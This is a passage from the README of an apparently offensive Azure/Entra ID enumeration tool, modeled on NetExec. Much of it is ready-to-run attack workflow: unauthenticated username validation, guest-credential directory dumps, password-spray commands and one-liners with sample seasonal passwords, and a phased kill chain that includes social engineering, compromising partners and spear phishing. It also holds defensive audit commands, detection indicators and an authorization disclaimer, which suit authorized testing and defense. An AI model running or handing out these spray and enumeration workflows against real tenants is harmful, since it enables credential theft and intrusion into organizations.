### Example Attack Flow

```powershell
# 1. Initial reconnaissance (no auth)
.\azx.ps1 tenant -Domain targetcorp.com -ExportPath tenant-info.json
.\azx.ps1 users -Domain targetcorp.com -CommonUsernames -ExportPath valid-users.csv

# 2. Obtain guest access (assume you now have guest credentials)
# Login as: compromised-vendor@partner.com

# 3. Enumerate as guest (low-noise reconnaissance)
.\azx.ps1 hosts -ExportPath devices.csv
.\azx.ps1 groups -ExportPath groups.csv
.\azx.ps1 pass-pol -ExportPath policy.json

# Result: Complete tenant inventory without triggering high-severity alerts
```

### What Can Guest Users Typically Enumerate?

With default guest permissions, you can often access:

✅ **Users**
- Display names, email addresses, job titles
- Department and office location
- Manager relationships
- Photos and profile information

✅ **Groups** (use `.\azx.ps1 groups`)
- Group names and descriptions
- Group membership (often)
- Distribution lists
- Microsoft Teams teams
- Security groups and mail-enabled groups
- Group types and creation dates

✅ **Devices** (use `.\azx.ps1 hosts`)
- Device names and IDs
- Operating systems and versions
- Compliance status
- Trust type (Azure AD joined, Hybrid)
- Last sign-in times
- Device owners (with `-ShowOwners` flag)

✅ **Applications**
- Registered applications
- Service principals
- OAuth permissions granted
- Redirect URIs

🟡 **Password Policies** (use `.\azx.ps1 pass-pol` - limited for guests)
- Password expiration settings (often visible)
- Domain configuration (often visible)
- Authentication methods (may be visible)
- Security Defaults status (often restricted)
- **Conditional Access Policies (usually restricted)**

❌ **What's Usually Restricted for Guests:**
- Conditional access policies (admin/member only)
- Full security defaults settings
- Most privileged role assignments
- Certain sensitive user attributes
- Detailed policy configurations
- Security posture details

### Defensive Recommendations

Organizations should **immediately** review and restrict guest user permissions:

#### 1. Review External Collaboration Settings
```powershell
# Check current guest settings
Get-MgPolicyAuthorizationPolicy | Select-Object -ExpandProperty GuestUserRoleId
```

#### 2. Restrict Guest Permissions (Recommended)
- **Navigate to**: Azure Portal → Entra ID → Users → User settings → External users
- **Set**: "Guest user access restrictions" to **"Guest users have limited access to properties and memberships of directory objects"** (most restrictive)

#### 3. Monitor Guest Activity
- Enable guest user sign-in logs
- Alert on guest users accessing Microsoft Graph API
- Review guest users regularly and remove unused accounts

#### 4. Conditional Access for Guests
- Require MFA for all guest users
- Restrict guest access to specific applications
- Block guest access from untrusted locations

#### 5. Regular Audits
```powershell
# List all guest users
Get-MgUser -Filter "userType eq 'Guest'" | Select-Object DisplayName, UserPrincipalName, CreatedDateTime

# Check guest permissions
Get-MgRoleManagementDirectoryRoleAssignment -Filter "principalId eq 'guest-user-id'"
```

### Detection and Monitoring

**Log Sources to Monitor:**
- **Azure AD Sign-in Logs**: Guest user authentication events
- **Audit Logs**: Guest user enumeration via Microsoft Graph
- **Microsoft Graph API Logs**: High volume of read requests from guest users

**Suspicious Indicators:**
- Guest user enumerating large numbers of users/devices/groups
- Guest user accessing Microsoft Graph API outside business hours
- Guest user with newly created account performing enumeration
- Multiple failed Graph API calls followed by successful enumeration

### Why This is Critical

🔴 **High Impact**:
- Complete directory enumeration with minimal privileges
- Low detection rate compared to compromised member accounts
- Perfect for initial reconnaissance in red team operations
- Can identify high-value targets for further attacks

🟡 **Common Misconfiguration**:
- Default settings favor collaboration over security
- Most organizations are **unaware** of guest enumeration capabilities
- Rarely monitored or audited

🔐 **Mitigation Priority**:
- **Immediate**: Review and restrict guest permissions
- **Short-term**: Implement monitoring for guest activity
- **Long-term**: Regular audits and least-privilege access model

### Quick Vulnerability Check

**For Defenders - Check if Your Org is Vulnerable:**
```powershell
# 1. Check external collaboration settings
Get-MgPolicyAuthorizationPolicy | Select-Object -ExpandProperty GuestUserRoleId

# 2. List all guest users
Get-MgUser -Filter "userType eq 'Guest'" | Measure-Object

# 3. Test what guests can see (safe - read-only)
# Login as a test guest account and run:
Get-MgUser -Top 10  # If this works, you're vulnerable
Get-MgDevice -Top 10  # If this works, you're VERY vulnerable
```

**Guest User Role IDs:**
- `a0b1b346-4d3e-4e8b-98f8-753987be4970` = **VULNERABLE** (Guest users have the same access as member users)
- `10dae51f-b6af-4016-8d66-8c2a99b929b3` = **LIMITED** (Guests have limited access - still allows some enumeration)
- `2af84b1e-32c8-42b7-82bc-daa82404023b` = **RESTRICTED** (Most restrictive - recommended)

**For Red Teamers - Quick Win Checklist:**
- [ ] Obtain guest credentials (social engineering, compromised partner, etc.)
- [ ] Run `.\azx.ps1 hosts` with guest creds
- [ ] If successful, run with `-ShowOwners -ExportPath loot.json`
- [ ] Enumerate users: `Get-MgUser -All`
- [ ] Enumerate groups: `Get-MgGroup -All`
- [ ] Identify high-value targets (admins, executives)
- [ ] Pivot to targeted phishing or credential attacks

## 🔐 Authentication

### Username Enumeration (No Authentication Required)
The `users` command uses the public GetCredentialType API endpoint and does not require authentication. This makes it perfect for:
- Initial reconnaissance and user discovery
- Validating email addresses before phishing campaigns (for authorized red team operations)
- User enumeration during penetration tests
- Identifying valid usernames for password spraying attacks (authorized only)

**How it Works:**
The tool queries `https://login.microsoftonline.com/common/GetCredentialType` which is a public endpoint used by Microsoft login pages to determine the authentication method for a username. The API returns:
- `IfExistsResult: 0` - User exists (Managed/Cloud authentication)
- `IfExistsResult: 1` - User does not exist
- `IfExistsResult: 5` - User exists (Alternate authentication)
- `IfExistsResult: 6` - User exists (Federated authentication)

**Domain Auto-Detection:**
If you don't specify a domain with `-Domain`, the tool will automatically attempt to detect your current user's domain from:
- User Principal Name (UPN) via `whoami /upn` (Windows)
- Environment variable `USERDNSDOMAIN`
- Current user's Windows identity

This allows you to quickly run `.\azx.ps1 users -CommonUsernames` without specifying a domain.

**Input Methods:**
1. **Single Username**: Check one specific username
2. **File Input**: Read usernames from a text file (one per line, comments starting with # are ignored)
3. **Common Usernames**: Use built-in list of common usernames (admin, administrator, support, helpdesk, etc.)

**Rate Limiting:**
The tool includes a 50ms delay between checks to avoid API throttling. For large username lists, the enumeration may take some time.

### Tenant Discovery (No Authentication Required)
The `tenant` command uses public OpenID configuration endpoints and does not require authentication. This makes it perfect for reconnaissance and initial discovery.

**Enhanced Enumeration**: The tool now performs comprehensive tenant reconnaissance similar to `nxc smb --enum`, including:
- **OpenID Configuration Analysis**: Queries both tenant-specific and common v2.0 OpenID endpoints
- **Exposed Application Discovery**: Identifies publicly accessible application IDs and client configurations
- **Redirect URI Enumeration**: Detects exposed redirect URIs that may indicate misconfigured applications
- **OAuth Misconfiguration Detection**: Flags potential security risks including:
  - Implicit flow configurations (security consideration for modern applications)
  - Risky grant types (password, client_credentials)
  - Publicly accessible federation metadata
- **Federation Metadata**: For federated tenants, attempts to retrieve and parse federation metadata XML
- **Endpoint Probing**: Checks for accessible Microsoft Graph and Azure Management endpoints

**What Gets Enumerated**:
1. **Standard OpenID Configuration**: Tenant ID, issuer, authorization/token endpoints, JWKS URI
2. **Security Posture**: Response types, grant types, supported scopes and claims
3. **Application Exposure**: App IDs, redirect URIs, and client configurations that are publicly accessible
4. **Federation Details**: Entity IDs and federation endpoints for federated authentication
5. **Misconfigurations**: Potentially risky OAuth/OIDC configurations that may indicate security weaknesses

**Auto-Detection Feature**: If you don't specify a domain, the tool will automatically attempt to detect your current user's domain from:
- User Principal Name (UPN) via `whoami /upn` (Windows)
- Environment variable `USERDNSDOMAIN`
- Current user's Windows identity

This allows you to quickly run `.\azx.ps1 tenant` without specifying a domain.

### Device Enumeration (Authentication Required)
On first run of the `hosts` command, the script will:
1. Check for the Microsoft.Graph module (install if missing)
2. Prompt for Microsoft Graph authentication
3. Request necessary permissions (Device.Read.All by default)
4. Cache credentials for subsequent runs

**Using Guest Credentials for Low-Noise Enumeration:**
```powershell
# Method 1: Interactive guest login
Disconnect-MgGraph
.\azx.ps1 hosts
# (Enter guest credentials when prompted: external-user@partner.com)

# Method 2: Explicitly specify scopes
.\azx.ps1 hosts -Scopes "User.Read.All,Group.Read.All,Device.Read.All"

# Method 3: Use guest credentials with additional enumeration
Connect-MgGraph -Scopes "User.Read.All","Device.Read.All"
.\azx.ps1 hosts -ShowOwners -ExportPath guest-enum.json
```

To switch accounts or tenants:
```powershell
Disconnect-MgGraph
.\azx.ps1 hosts
```

## 📁 Export Formats

### Username Enumeration Export

#### CSV Export
```powershell
.\azx.ps1 users -Domain example.com -CommonUsernames -ExportPath users.csv
```
Includes: Username, Exists (True/False), IfExistsResult (numeric code), AuthType (Managed/Federated/Alternate), ThrottleStatus

#### JSON Export (Recommended for automation)
```powershell
.\azx.ps1 users -Domain example.com -UserFile users.txt -ExportPath results.json
```
Structured JSON with all response details including throttle status and full API response data

### User Profile Enumeration Export

#### CSV Export
```powershell
.\azx.ps1 user-profiles -ExportPath users.csv
```
Includes: UserId, DisplayName, UserPrincipalName, Mail, JobTitle, Department, OfficeLocation, UserType, AccountEnabled, LastSignInDateTime

#### JSON Export (Recommended)
```powershell
.\azx.ps1 user-profiles -ExportPath users.json
```
Structured JSON with all user profile properties including sign-in activity

### Tenant Discovery Export

#### JSON Export (Recommended)
```powershell
.\azx.ps1 tenant -Domain example.com -ExportPath tenant.json
```
Includes: Domain, TenantId, Issuer, all endpoints, federation status, supported response types, scopes, claims, **exposed applications**, **redirect URIs**, **potential misconfigurations**, and full OpenID configuration

#### CSV Export
```powershell
.\azx.ps1 tenant -Domain example.com -ExportPath tenant.csv
```
Includes: Domain, TenantId, Issuer, endpoints, and federation status (simplified view - JSON recommended for full security findings)

### Device Enumeration Export

#### CSV Export
```powershell
.\azx.ps1 hosts -ExportPath output.csv
```
Includes: DeviceId, DisplayName, OperatingSystem, OperatingSystemVersion, TrustType, IsCompliant, AccountEnabled, ApproximateLastSignInDateTime, RegisteredOwners

#### JSON Export
```powershell
.\azx.ps1 hosts -ExportPath output.json
```
Structured JSON with all device properties

### Group Enumeration Export

#### CSV Export
```powershell
.\azx.ps1 groups -ExportPath groups.csv
```
Includes: GroupId, DisplayName, Description, GroupTypes, SecurityEnabled, MailEnabled, Mail, MailNickname, CreatedDateTime, MemberCount

#### JSON Export (Recommended)
```powershell
.\azx.ps1 groups -ExportPath groups.json
```
Structured JSON with all group properties and detailed information

### Password Policy Export

#### JSON Export (Recommended)
```powershell
.\azx.ps1 pass-pol -ExportPath policy.json
```
Includes: TenantId, TenantDisplayName, PasswordPolicies (ValidityPeriodDays, NotificationWindowDays), SecurityDefaults (enabled/disabled), ConditionalAccessPolicies (full list), AuthenticationMethods (enabled methods)

#### CSV Export (Simplified)
```powershell
.\azx.ps1 pass-pol -ExportPath policy.csv
```
Includes: TenantId, TenantDisplayName, PasswordValidityDays, PasswordNotificationDays, SecurityDefaultsEnabled, ConditionalAccessPolicyCount (flattened structure)

### Guest Login Enumeration Export

#### JSON Export (Recommended)
```powershell
.\azx.ps1 guest -Domain target.com -UserFile users.txt -Password 'Pass123' -ExportPath spray.json
```
Includes: Domain, TenantConfig (NameSpaceType, FederationType, AcceptsExternalUsers), AuthResults (per-user results with Success, MFARequired, ErrorCode), Summary (counts)

#### CSV Export
```powershell
.\azx.ps1 guest -Domain target.com -UserFile users.txt -Password 'Pass123' -ExportPath spray.csv
```
Includes: Username, Password, Success, MFARequired, ConsentRequired, ErrorCode, HasToken (one row per tested credential)

## 🛠️ Troubleshooting

### Guest User Enumeration Issues

#### "Insufficient privileges to complete the operation" (as guest)
- The organization HAS restricted guest permissions (good security!)
- Guest users cannot access the requested resource
- This means the org is **not vulnerable** to guest enumeration
- Try with lower scopes: `-Scopes "User.Read"`

#### Guest Login Successful But No Enumeration Allowed
This is the **desired security posture**. It means:
- External collaboration is enabled (guests can sign in)
- But guest permissions are properly restricted
- The organization has followed security best practices

#### "Access Denied" for Device Enumeration as Guest
- This is normal and expected in **properly configured** tenants
- Most organizations restrict Device.Read.All from guests
- Try user/group enumeration which is more commonly allowed:
```powershell
Get-MgUser -All
Get-MgGroup -All
```

#### How to Tell if an Org is Vulnerable to Guest Enumeration
Look for these indicators:
1. ✅ Guest login successful
2. ✅ Can enumerate users/devices without errors
3. ✅ Can see detailed properties (job titles, departments, etc.)
4. ✅ Can see group memberships
5. ❌ If you get "Access Denied" = org is properly secured

### Guest Login Enumeration Issues

#### "ROPC disabled (try device code flow)"
- The organization has disabled Resource Owner Password Credential (ROPC) flow
- This is a **good security practice** that prevents password spray attacks via this method
- Try using device code flow or interactive authentication instead
- The target organization has security controls in place

#### "Invalid credentials" for all users
- Verify the domain is correct
- Check if usernames require the full UPN format (`user@domain.com`)
- The passwords may genuinely be incorrect
- ROPC may be blocked by Conditional Access policies

#### "MFA Required" for valid credentials
- This is a **successful credential test** - the password is correct!
- MFA is blocking the login, but credentials are valid
- This indicates the account is protected by MFA (good for the target)
- For red team: note these as "valid creds with MFA" for further analysis

#### "Account Locked" messages
- Too many failed authentication attempts have locked the account
- Be careful with password spray - implement proper delays
- This may indicate security controls or previous attack activity
- Wait before retrying to avoid permanent lockout

#### "Tenant not found or not accessible"
- Verify the domain spelling
- Try using the `.onmicrosoft.com` domain variant
- The domain may not be an Azure/Entra tenant

### Username Enumeration Issues

#### "Please provide one of: -Username, -UserFile, or -CommonUsernames"
- You must specify at least one input method for usernames
- Use `-Username` for single user, `-UserFile` for file input, or `-CommonUsernames` for common names
- Domain can be omitted and will be auto-detected from your current user context

#### Rate Limiting / Throttling
- The GetCredentialType API may throttle requests if too many are made too quickly
- The tool includes a 50ms delay between requests
- If you encounter throttling, try checking smaller batches of usernames
- The `ThrottleStatus` field in the response indicates if throttling is occurring

#### "User file not found"
- Verify the path to your username file is correct
- Use absolute paths or paths relative to the current directory

#### No Valid Usernames Found
- This is expected behavior if the usernames don't exist in the tenant
- Verify you're using the correct domain name (or let it auto-detect)
- Try the `-CommonUsernames` flag to test with known common usernames
- Check if the domain is correct using: `.\azx.ps1 tenant -Domain example.com`

#### "Could not auto-detect domain"
- The tool couldn't automatically determine your domain
- Manually specify the domain using: `-Domain example.com`
- Ensure you're logged in with a domain account (not a local account)

### Tenant Discovery Issues

#### "Failed to retrieve tenant configuration"
- Verify the domain name is correct
- Ensure you have internet connectivity
- Check if the domain is actually an Azure/Entra tenant
- Some domains may not have public OpenID configuration endpoints

#### "The specified domain does not appear to be a valid Azure/Entra tenant"
- Verify the domain spelling
- Try using the .onmicrosoft.com domain variant
- The domain may not be federated with Azure/Entra ID

#### "Could not auto-detect domain"
- The tool couldn't automatically determine your domain
- Manually specify the domain using: `.\azx.ps1 tenant -Domain example.com`
- Ensure you're logged in with a domain account (not a local account)

### Device Enumeration Issues

#### "Microsoft.Graph module not found"
The script will automatically install the module. If installation fails:
```powershell
Install-Module Microsoft.Graph -Scope CurrentUser -Force
```

#### "Failed to connect to Microsoft Graph"
- Ensure you have internet connectivity
- Check if your organization allows Microsoft Graph API access
- Verify you have the necessary Azure/Entra ID permissions

#### "No devices found"
- Verify your account has Device.Read.All permissions
- Check if your filter criteria is too restrictive
- Ensure devices exist in the tenant

#### Permission Issues
If you encounter permission errors:
1. Request Device.Read.All permissions from your Azure AD administrator
2. For owner enumeration, you may need Directory.Read.All permissions

### Group Enumeration Issues

#### "Failed to retrieve groups"
- Verify your account has Group.Read.All or Directory.Read.All permissions
- Guest users may have restricted access to group enumeration
- Check if your organization restricts guest user permissions

#### "No groups found or insufficient permissions"
- This may indicate proper security configuration (guest users restricted)
- Try with a member account to confirm groups exist
- Check guest permission settings in Azure AD

#### "Insufficient privileges to complete the operation" (as guest)
- The organization has properly restricted guest permissions (good security!)
- Guest users cannot access group information
- This is the **recommended** security posture
- You may be able to see groups with lower scopes or as a member user

#### Slow Group Enumeration
- Using `-ShowOwners` flag makes additional API calls for each group
- For large organizations, this can take significant time
- Consider running without `-ShowOwners` first, then target specific groups

### Password Policy Enumeration Issues

#### "Failed to retrieve organization details"
- Verify you have Organization.Read.All and Directory.Read.All permissions
- Guest users typically have limited access to organizational settings
- Request appropriate permissions or use a member account

#### "Failed to check Security Defaults"
- Requires Policy.Read.All permissions
- Guest users typically **cannot** view security policies
- This is expected behavior for guest accounts
- Use a member account with appropriate permissions

#### "Failed to enumerate Conditional Access Policies"
- Requires Policy.Read.All permissions
- **Guest users are typically blocked** from viewing CA policies (by design)
- This is a **security feature** to prevent policy enumeration by external users
- Member accounts with appropriate permissions can view these policies

#### Partial Information Retrieved
- Some policy information requires elevated permissions
- Basic password policies may be visible with Organization.Read.All
- Full security posture assessment requires Policy.Read.All
- Guest users will see limited information (expected behavior)

#### "Guest users typically cannot view Conditional Access Policies"
- This is **normal and expected** behavior
- Conditional Access policies are considered sensitive security information
- Organizations properly restrict this from guest users
- If you see this message as a guest, the org has good security practices

## 📄 License

This project is licensed under the GNU General Public License v3.0 - see the [LICENSE](LICENSE) file for details.

```
Copyright (C) 2025 Logisek
https://github.com/Logisek/AZexec

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.
```

## 🤝 Contributing

Contributions, issues, and feature requests are welcome!

## ⚠️ Disclaimer

This tool is provided for **legitimate security testing, research, and administrative purposes only**. 

**Important Guidelines:**

1. **Authorization Required**: Always obtain explicit written authorization before testing any Azure/Entra ID tenant that you do not own.

2. **Guest User Enumeration**: The guest user enumeration techniques demonstrated in this tool are for:
   - **Red team engagements** with proper authorization
   - **Security assessments** to test organizational defenses
   - **Educational purposes** to understand Azure security
   - **Defensive research** to improve security posture

3. **Responsible Disclosure**: If you discover vulnerabilities during authorized testing, follow responsible disclosure practices.

4. **Legal Compliance**: Ensure your activities comply with all applicable laws and regulations in your jurisdiction.

5. **Ethical Use**: Do not use this tool for unauthorized access, data theft, or any malicious activities.

**The authors assume no liability for misuse or damage caused by this tool. Users are solely responsible for ensuring proper authorization and legal compliance.**

## 👤 Author

**Logisek**
- GitHub: [@Logisek](https://github.com/Logisek)
- Project Link: [https://github.com/Logisek/AZexec](https://github.com/Logisek/AZexec)

## 🌟 Acknowledgments

- Inspired by the netexec tool
- Built with Microsoft Graph PowerShell SDK
- Guest user enumeration research inspired by years of Azure security assessments revealing this consistently overlooked vulnerability

## 📝 Quick Reference - Penetration Testing Cheat Sheet

### Reconnaissance Flow

```
┌─────────────────────────────────────────────────────────────┐
│  PHASE 1: EXTERNAL RECONNAISSANCE (No Authentication)       │
├─────────────────────────────────────────────────────────────┤
│  .\azx.ps1 tenant -Domain target.com                        │
│  .\azx.ps1 users -Domain target.com -CommonUsernames        │
│  .\azx.ps1 guest -Domain target.com  # Check B2B config     │
│                                                              │
│  Output: Tenant ID, valid usernames, federation status      │
└──────────────────────┬──────────────────────────────────────┘
                       │
                       ↓
┌─────────────────────────────────────────────────────────────┐
│  PHASE 1b: GUEST LOGIN TESTING (Like nxc smb -u 'a' -p '') │
├─────────────────────────────────────────────────────────────┤
│  .\azx.ps1 guest -Domain target.com -UserFile users.txt \   │
│    -Password 'Summer2024!'                                   │
│                                                              │
│  Output: Valid creds, MFA status, locked accounts           │
└──────────────────────┬──────────────────────────────────────┘
                       │
                       ↓
┌─────────────────────────────────────────────────────────────┐
│  PHASE 2: OBTAIN GUEST ACCESS (Social Engineering)          │
├─────────────────────────────────────────────────────────────┤
│  - Register as "vendor" or "consultant"                     │
│  - Compromise partner organization                          │
│  - Leaked credentials from breaches                         │
│  - Use valid creds from Phase 1b (if MFA not required)     │
│                                                              │
│  Result: guest@partner.com credentials                      │
└──────────────────────┬──────────────────────────────────────┘
                       │
                       ↓
┌─────────────────────────────────────────────────────────────┐
│  PHASE 3: GUEST ENUMERATION (Low-Noise Reconnaissance)      │
├─────────────────────────────────────────────────────────────┤
│  .\azx.ps1 hosts -ShowOwners -ExportPath loot.json         │
│  .\azx.ps1 groups -ExportPath groups.json                   │
│  .\azx.ps1 pass-pol -ExportPath policy.json                 │
│  Get-MgUser -All | Export-Csv users.csv                     │
│                                                              │
│  Detection Risk: LOW (appears as normal collaboration)      │
└──────────────────────┬──────────────────────────────────────┘
                       │
                       ↓
┌─────────────────────────────────────────────────────────────┐
│  PHASE 4: ANALYSIS & TARGET IDENTIFICATION (Offline)        │
├─────────────────────────────────────────────────────────────┤
│  - Identify privileged accounts (admins, global admins)     │
│  - Map organizational structure                             │
│  - Find non-compliant devices                               │
│  - Locate high-value targets (executives, finance)          │
│  - Identify legacy/unpatched systems                        │
└──────────────────────┬──────────────────────────────────────┘
                       │
                       ↓
┌─────────────────────────────────────────────────────────────┐
│  PHASE 5: TARGETED ATTACK                                   │
├─────────────────────────────────────────────────────────────┤
│  - Spear phishing campaigns                                 │
│  - Password spraying                                         │
│  - Credential stuffing                                       │
│  - Exploitation of vulnerable devices                       │
└─────────────────────────────────────────────────────────────┘
```

### Commands Cheat Sheet

| Objective | Command | Authentication | NetExec Equivalent |
|-----------|---------|----------------|--------------------|
| Discover tenant | `.\azx.ps1 tenant -Domain target.com` | ❌ None | `nxc smb --enum` |
| Validate usernames | `.\azx.ps1 users -Domain target.com -CommonUsernames` | ❌ None | `nxc smb --users` |
| **Enumerate user profiles** | `.\azx.ps1 user-profiles -ExportPath users.csv` | ✅ Guest/Member | `nxc smb --rid-brute` |
| **Test null login** | `.\azx.ps1 guest -Domain target.com -Username user -Password ''` | ❌ None | **`nxc smb -u 'a' -p ''`** |
| **Password spray** | `.\azx.ps1 guest -Domain target.com -UserFile users.txt -Password 'Pass123'` | ❌ None | `nxc smb -u users.txt -p 'Pass123'` |
| **Username enum + spray** | See [Complete Password Spray Attack](#complete-password-spray-attack-workflow) | ❌ None | `nxc smb -u users.txt -p 'Pass123'` |
| Enumerate devices | `.\azx.ps1 hosts` (login with guest creds) | ✅ Guest | `nxc smb --hosts` |
| Enumerate groups | `.\azx.ps1 groups` | ✅ Guest/Member | `nxc smb --groups` |
| Password policies | `.\azx.ps1 pass-pol` | ✅ Guest/Member | `nxc smb --pass-pol` |
| Full device enum | `.\azx.ps1 hosts -ShowOwners -ExportPath out.json` | ✅ Guest/Member | - |
| Test guest perms | `Get-MgUser -Top 10` (after connecting) | ✅ Guest | - |
| Enumerate all users | `.\azx.ps1 user-profiles` | ✅ Guest/Member | - |

### Defensive Audit Commands

| Check | Command | What to Look For |
|-------|---------|------------------|
| Guest user settings | `Get-MgPolicyAuthorizationPolicy \| Select -ExpandProperty GuestUserRoleId` | Should be `2af84b1e-32c8-42b7-82bc-daa82404023b` (most restrictive) |
| List all guests | `Get-MgUser -Filter "userType eq 'Guest'" \| ft DisplayName,UserPrincipalName` | Review and remove unnecessary guests |
| Guest API activity | Check Azure AD Audit Logs → Filter by guest users and Microsoft Graph | Look for unusual enumeration patterns |
| Guest sign-ins | Check Azure AD Sign-in Logs → Filter by guest users | Monitor for suspicious login locations/times |

### Complete Password Spray Attack Workflow

AZexec provides a two-phase approach to password spraying that mimics NetExec's workflow:

**Phase 1: Username Enumeration (GetCredentialType API)**
```powershell
# Enumerate valid usernames using GetCredentialType API (no authentication required)
.\azx.ps1 users -Domain target.com -CommonUsernames -ExportPath valid-users.csv
```

**Phase 2: Password Spraying (ROPC Authentication)**
```powershell
# Extract just the valid usernames from CSV
$validUsers = Import-Csv valid-users.csv | Where-Object { $_.Exists -eq 'True' } | Select-Object -ExpandProperty Username

# Create a username file for spraying
$validUsers | Out-File -FilePath validated-users.txt

# Perform password spray with a single password
.\azx.ps1 guest -Domain target.com -UserFile validated-users.txt -Password 'Summer2024!' -ExportPath spray-results.json
```

**One-Liner Workflow:**
```powershell
# Quick spray with common usernames
.\azx.ps1 users -Domain target.com -CommonUsernames -ExportPath valid.csv; $validUsers = (Import-Csv valid.csv | Where-Object { $_.Exists -eq 'True' }).Username | Out-File temp-users.txt; .\azx.ps1 guest -Domain target.com -UserFile temp-users.txt -Password 'Winter2024!' -ExportPath spray.json; Remove-Item temp-users.txt
```

**Why Two Separate Commands?**

The GetCredentialType API (used by `users` command) only validates username existence - it doesn't test passwords. This is by design:
- **Phase 1 (`users`)**: Uses Microsoft's public GetCredentialType endpoint to check if usernames exist
- **Phase 2 (`guest`)**: Uses ROPC (Resource Owner Password Credentials) OAuth2 flow to test actual authentication

This separation provides several benefits:
1. **Stealth**: Username enumeration doesn't trigger authentication logs
2. **Efficiency**: Only spray against validated usernames (avoid account lockouts on non-existent users)
3. **Flexibility**: Use different password lists or techniques between phases
4. **Safety**: Validate targets before attempting authentication (reduces noise and lockout risk)

**NetExec Equivalent:**
```bash
# Traditional NetExec workflow
nxc smb 192.168.1.0/24 --users          # Enumerate users
nxc smb 192.168.1.0/24 -u users.txt -p 'Password123'  # Password spray

# AZexec equivalent
.\azx.ps1 users -Domain target.com -CommonUsernames -ExportPath users.csv
.\azx.ps1 guest -Domain target.com -UserFile users.txt -Password 'Password123'
```

---

**Note**: This tool requires PowerShell 7+ and appropriate Azure/Entra ID permissions. Always ensure you have proper authorization before conducting any enumeration activities.
